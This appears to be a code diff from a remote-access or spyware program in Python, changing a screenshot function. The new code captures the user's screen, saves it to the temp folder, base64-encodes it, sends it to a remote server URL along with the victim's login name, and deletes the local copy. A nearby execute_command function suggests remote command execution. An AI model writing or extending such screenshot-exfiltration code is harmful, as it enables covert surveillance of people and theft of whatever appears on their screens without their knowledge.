@@ -124,12 +124,21 @@ def take_screenshot():
     try:
         img_name = random.randint(1, 99999999)
         img = pg.screenshot()
-        img_path = os.path.join(current_directory, f'{img_name}.png')
+
+        img_path = os.path.join(os.getenv('TEMP'), f'{img_name}.png')
         img.save(img_path)
 
-        requests.get(f"{URL}/ss?target={os.getlogin()}&state=false")
+        with open(img_path, "rb") as image_file:
+            encoded_image_data = base64.b64encode(image_file.read()).decode('utf-8')
+
+        url = f"{URL}/ss?target={os.getlogin()}&state=false&imgdata={encoded_image_data}"
+
+        requests.get(url)
+
+        os.remove(img_path)
+
     except Exception as e:
-        pass
+        print(e)
 
 def execute_command(command):
     try:
